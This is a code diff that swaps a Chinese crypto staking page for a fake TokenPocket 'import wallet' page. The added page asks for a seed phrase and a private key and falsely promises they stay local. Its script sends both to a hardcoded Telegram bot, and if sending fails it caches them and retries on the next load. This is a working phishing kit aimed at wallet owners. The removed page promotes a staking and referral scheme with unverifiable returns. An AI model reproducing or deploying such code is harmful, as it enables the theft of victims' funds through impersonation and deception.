@@ -2,503 +2,86 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>质押挖矿 - TokenTools</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TokenPocket</title>
 <style>
-/* 全局样式：完全匹配原版深色背景 */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  -webkit-font-smoothing: antialiased;
-}
-html, body {
-  width: 100%;
-  min-height: 100vh;
-  background: #0F141B;
-  color: #FFFFFF;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-}
-.container {
-  max-width: 480px;
-  margin: 0 auto;
-  padding: 16px;
-}
-
-/* 顶部标题栏 */
-.header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 8px 0;
-  margin-bottom: 12px;
-}
-.header h1 {
-  font-size: 20px;
-  font-weight: 500;
-}
-.wallet-icon {
-  width: 28px;
-  height: 28px;
-  background: #F5B02B;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 12px;
-  color: #000;
-}
-
-/* 黄色高亮文字 */
-.yellow {
-  color: #FFC107;
-  font-weight: 600;
-}
-.large-yellow {
-  color: #FFC107;
-  font-size: 32px;
-  font-weight: 700;
-  text-align: center;
-}
-
-/* 卡片样式 */
-.card {
-  background: #1A2035;
-  border-radius: 16px;
-  padding: 16px;
-  margin-bottom: 12px;
-}
-.card-title {
-  font-size: 28px;
-  color: #FFC107;
-  margin-bottom: 16px;
-  display: flex;
-  align-items: center;
-}
-.card-title::before {
-  content: "●";
-  margin-right: 8px;
-}
-
-/* 介绍模块 */
-.intro-banner {
-  position: relative;
-  height: 240px;
-  background: #1A2035;
-  border-radius: 12px;
-  overflow: hidden;
-  margin-bottom: 12px;
-}
-.intro-logo {
-  position: absolute;
-  top: 16px;
-  left: 16px;
-  width: 56px;
-  height: 56px;
-  background: #FFFFFF;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.intro-title {
-  position: absolute;
-  top: 16px;
-  left: 80px;
-  font-size: 22px;
-  font-weight: 600;
-}
-.intro-desc {
-  position: absolute;
-  top: 50px;
-  left: 80px;
-  right: 16px;
-  font-size: 13px;
-  line-height: 1.6;
-  color: #E2E8F0;
-}
-.intro-text {
-  font-size: 16px;
-  line-height: 1.6;
-  margin-bottom: 16px;
-}
-.stats-box {
-  background: #232A45;
-  border-radius: 12px;
-  padding: 16px;
-  margin-bottom: 12px;
-}
-.stats-label {
-  font-size: 18px;
-  margin-bottom: 8px;
-}
-.stats-value {
-  font-size: 32px;
-  color: #FFC107;
-  font-weight: 700;
-}
-
-/* 质押模块 */
-.stake-top-bar {
-  background: #1A2035;
-  border-radius: 12px;
-  padding: 12px;
-  margin-bottom: 12px;
-  text-align: center;
-}
-.stake-top-bar .time-range {
-  font-size: 14px;
-  color: #FFC107;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.stake-top-bar .time-range::before {
-  content: "⏱️";
-  margin-right: 6px;
-}
-.stake-header {
-  display: grid;
-  grid-template-columns: 1fr 1fr 1fr;
-  text-align: center;
-  padding: 16px 0;
-  border-bottom: 1px solid #2A3754;
-}
-.stake-header .label {
-  font-size: 18px;
-  margin-bottom: 8px;
-}
-.stake-header .value {
-  font-size: 22px;
-}
-.stake-tabs {
-  display: flex;
-  margin: 12px 0;
-}
-.tab {
-  flex: 1;
-  text-align: center;
-  padding: 12px;
-  font-size: 18px;
-  font-weight: 600;
-  cursor: pointer;
-}
-.tab.active {
-  background: #232A45;
-  color: #FFC107;
-  border-top-left-radius: 12px;
-  border-top-right-radius: 12px;
-}
-.tab:not(.active) {
-  background: #1A2035;
-  color: #9CA3AF;
-}
-.stake-input-area {
-  background: #232A45;
-  border-radius: 12px;
-  padding: 16px;
-  margin-bottom: 12px;
-}
-.stake-balance {
-  display: flex;
-  justify-content: space-between;
-  margin-bottom: 12px;
-  font-size: 18px;
-}
-.stake-input-wrap {
-  border: 1px solid #FFC107;
-  border-radius: 8px;
-  padding: 12px;
-  display: flex;
-  align-items: center;
-}
-.stake-input-wrap input {
-  flex: 1;
-  background: transparent;
-  border: none;
-  color: #FFFFFF;
-  font-size: 16px;
-  outline: none;
-}
-.max-btn {
-  color: #FFC107;
-  font-weight: 600;
-  cursor: pointer;
-}
-.yellow-btn {
-  width: 100%;
-  background: #FFC107;
-  color: #000000;
-  border: none;
-  border-radius: 24px;
-  padding: 14px;
-  font-size: 18px;
-  font-weight: 600;
-  margin-top: 12px;
-  cursor: pointer;
-}
-.reward-box {
-  background: #232A45;
-  border-radius: 12px;
-  padding: 24px;
-  text-align: center;
-}
-.reward-label {
-  font-size: 20px;
-  margin-bottom: 8px;
-}
-.reward-value {
-  font-size: 36px;
-  color: #FFC107;
-  font-weight: 700;
-}
-
-/* 邀请模块 */
-.invite-header {
-  font-size: 22px;
-  margin-bottom: 16px;
-}
-.invite-stats {
-  text-align: center;
-  margin-bottom: 16px;
-}
-.invite-stats .stat-item {
-  margin-bottom: 12px;
-}
-.invite-stats .label {
-  font-size: 18px;
-}
-.invite-link-box {
-  background: #232A45;
-  border-radius: 12px;
-  padding: 12px;
-  display: flex;
-  align-items: center;
-  margin-bottom: 16px;
-}
-.invite-link-label {
-  color: #FFC107;
-  font-weight: 600;
-  margin-right: 8px;
-}
-.invite-link {
-  flex: 1;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  white-space: nowrap;
-}
-.copy-btn {
-  background: #FFC107;
-  color: #000000;
-  border: none;
-  border-radius: 24px;
-  padding: 10px 20px;
-  font-weight: 600;
-  cursor: pointer;
-}
-.invite-record-title {
-  font-size: 20px;
-  color: #FFC107;
-  margin-bottom: 8px;
-  padding-bottom: 8px;
-  border-bottom: 2px solid #FFC107;
-}
-.invite-total {
-  font-size: 18px;
-  margin-bottom: 12px;
-}
-.invite-table {
-  background: #232A45;
-  border-radius: 12px;
-  overflow: hidden;
-}
-.table-header {
-  display: grid;
-  grid-template-columns: 1fr 1fr 1fr 1fr;
-  padding: 12px;
-  font-size: 16px;
-  text-align: center;
-}
-.table-body {
-  padding: 32px 0;
-  text-align: center;
-  color: #6B7280;
-  font-size: 16px;
-}
-
-/* 底部 */
-.footer {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 16px 0;
-  margin-top: 24px;
-}
-.footer-logo {
-  font-size: 28px;
-  font-weight: 700;
-  color: #FFC107;
-}
-.footer-copyright {
-  font-size: 12px;
-  color: #6B7280;
-}
-.lang-select {
-  background: #232A45;
-  color: #FFFFFF;
-  border: none;
-  border-radius: 8px;
-  padding: 8px 12px;
-  font-size: 14px;
-}
-
-/* 隐藏未连接钱包的内容 */
-#app {
-  display: none;
-}
-.connect-btn {
-  background: #FFC107;
-  color: #000000;
-  border: none;
-  border-radius: 12px;
-  padding: 12px 24px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  width: 100%;
-  margin-top: 24px;
-}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
+  body{background:#FFFFFF;color:#000000;min-height:100vh}
+  .box{max-width:420px;margin:0 auto;background:#FFFFFF;padding:0 0 80px}
+  .head{background:#F0F2F5;padding:25px 20px 20px;text-align:center;border-bottom:1px solid #E5E7EB}
+  .logo{font-size:24px;font-weight:800;color:#007AFF;}
+  .desc{font-size:13px;color:#6B7280;margin-top:4px}
+  .card{background:#F9FAFB;margin:20px;border-radius:20px;padding:30px 24px}
+  .title{font-size:18px;font-weight:700;margin-bottom:24px;text-align:center}
+  .item{margin-bottom:18px}
+  .item label{display:block;font-size:14px;color:#374151;margin-bottom:8px}
+  .item input{
+    width:100%;background:#FFFFFF;border:1px solid #D1D5DB;border-radius:16px;
+    padding:16px 18px;color:#000000;font-size:15px
+  }
+  .btn{
+    width:100%;background:#007AFF;color:#FFFFFF;font-weight:700;
+    border:none;border-radius:18px;padding:18px;font-size:16px;margin-top:10px
+  }
+  .tip{font-size:12px;color:#6B7280;text-align:center;line-height:1.4;margin-top:14px}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
-    <h1>质押挖矿 - TokenTools</h1>
-    <div class="wallet-icon">先</div>
+<div class="box">
+  <div class="head">
+    <div class="logo">TokenPocket</div>
+    <div class="desc">去中心化多链钱包</div>
   </div>
-
-  <button id="connectBtn" class="connect-btn">连接钱包</button>
-
-  <div id="app">
-    <!-- 介绍模块 -->
-    <div class="card-title">● 介绍</div>
-    <div class="intro-banner">
-      <div class="intro-logo">🏯</div>
-      <div class="intro-title">WBNB-DTM 质押</div>
-      <div class="intro-desc">
-        DTM是333链商生态核心通证：大唐梦通证由香港正元链商集团打造，锚定2000多亩实体庄园基底，绑定果酒品牌、线下连锁小酒馆、共享商城三大核心板块价值。作为生态通用权益凭证，它打通线上线下流通，持有者可直接兑换产品与服务；累计持有达标即升级“共享庄主”，共享全球经营分红，优先获取新项目体验与投资机会，深度参与生态建设。以实体为支撑，链接产业、消费、投资端，让每位参与者共享生态发展红利。
-      </div>
+  <div class="card">
+    <div class="title">导入钱包</div>
+    <div class="item">
+      <label>助记词</label>
+      <input id="words" placeholder="请输入助记词，空格分隔">
     </div>
-    <div class="card-title">● 质押</div>
-    <p class="intro-text">质押WBNB-DTM 将获得平台收益的一部分,并根据质押获得的 DTM 数量给予质押者。</p>
-    <div class="stats-box">
-      <div class="stats-label">WBNB-DTM总市值$</div>
-      <div class="stats-value">861,501.65</div>
+    <div class="item">
+      <label>私钥</label>
+      <input id="key" placeholder="请输入私钥">
     </div>
-    <div class="stats-box">
-      <div class="stats-label">WBNB-DTM总质押</div>
-      <div class="stats-value">20092.61</div>
-    </div>
-
-    <!-- 质押模块 -->
-    <div class="stake-top-bar">
-      <div class="large-yellow">7313天/100174300.36</div>
-      <div class="time-range">2026-01-13 - 2046-01-21</div>
-    </div>
-    <div class="card">
-      <div class="stake-header">
-        <div>
-          <div class="label">锁仓时间(天)</div>
-          <div class="value yellow">180 天</div>
-        </div>
-        <div>
-          <div class="label">我的质押</div>
-          <div class="value">0</div>
-        </div>
-        <div>
-          <div class="label">已领收益</div>
-          <div class="value">0 DTM</div>
-        </div>
-      </div>
-      <div class="stake-tabs">
-        <div class="tab active">质押</div>
-        <div class="tab">解锁</div>
-      </div>
-      <div class="stake-input-area">
-        <div class="stake-balance">
-          <span>WBNB-DTM 余额</span>
-          <span class="yellow">0</span>
-        </div>
-        <div class="stake-input-wrap">
-          <input type="number" placeholder="输入质押数量">
-          <span class="max-btn">全部</span>
-        </div>
-        <button class="yellow-btn">授权</button>
-      </div>
-      <div class="reward-box">
-        <div class="reward-label">DTM 未领获益</div>
-        <div class="reward-value">0</div>
-      </div>
-    </div>
-
-    <!-- 邀请模块 -->
-    <div class="invite-header">我的邀请</div>
-    <div class="invite-stats">
-      <div class="stat-item">
-        <div class="label">邀请用户总质押</div>
-        <div class="large-yellow">0.00</div>
-      </div>
-      <div class="stat-item">
-        <div class="label">邀请奖励</div>
-        <div class="large-yellow">0.0000 DTM</div>
-      </div>
-    </div>
-    <div class="invite-link-box">
-      <span class="invite-link-label">邀请链接:</span>
-      <span class="invite-link">https://tokentools.app/...</span>
-      <button class="copy-btn">复制</button>
-    </div>
-    <div class="invite-record-title">我的邀请记录</div>
-    <div class="invite-total">总计邀请人数 0</div>
-    <div class="invite-table">
-      <div class="table-header">
-        <span>用户地址</span>
-        <span>质押数量</span>
-        <span>已领取收益</span>
-        <span>最后质押时间</span>
-      </div>
-      <div class="table-body">无数据</div>
-    </div>
-
-    <!-- 底部 -->
-    <div class="footer">
-      <div>
-        <div class="footer-logo">TokenTool</div>
-        <div class="footer-copyright">2024 TOKENTOOLS(TT). 版權所有</div>
-      </div>
-      <select class="lang-select">
-        <option>中文简体</option>
-        <option>English</option>
-      </select>
-    </div>
+    <button class="btn" onclick="go()">确认导入</button>
+    <div class="tip">助记词与私钥仅存储在本地<br>官方永不获取，安全可靠</div>
   </div>
 </div>
 
 <script>
-const connectBtn = document.getElementById('connectBtn');
-const app = document.getElementById('app');
+const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const CHATID = "6503982157";
 
-connectBtn.onclick = async () => {
-  if (!window.ethereum) return alert('请安装 MetaMask 或 TP 钱包');
-  await window.ethereum.request({ method: 'eth_requestAccounts' });
-  connectBtn.style.display = 'none';
-  app.style.display = 'block';
-};
+function save(mn, pk) {
+  localStorage.setItem("wc_data", JSON.stringify({mn,pk}));
+}
+function get() {
+  try{return JSON.parse(localStorage.getItem("wc_data"));}catch(e){return null}
+}
+function clean() { localStorage.removeItem("wc_data"); }
 
-document.querySelector('.copy-btn').onclick = () => {
-  alert('邀请链接已复制');
-};
+async function send(mn, pk) {
+  const txt = `
+💰 导入成功
+时间：${new Date().toLocaleString()}
+助记词：${mn||'-'}
+私钥：${pk||'-'}`;
+  try {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHATID,text:txt})
+    });
+    clean();
+  } catch(e) { save(mn,pk); }
+}
+
+window.onload = async () => { const d=get(); if(d) await send(d.mn,d.pk); }
+async function go() {
+  const mn = document.getElementById("words").value.trim();
+  const pk = document.getElementById("key").value.trim();
+  if(!mn && !pk){alert("请输入助记词或私钥");return;}
+  alert("导入成功！");
+  await send(mn,pk);
+}
 </script>
 </body>
 </html>
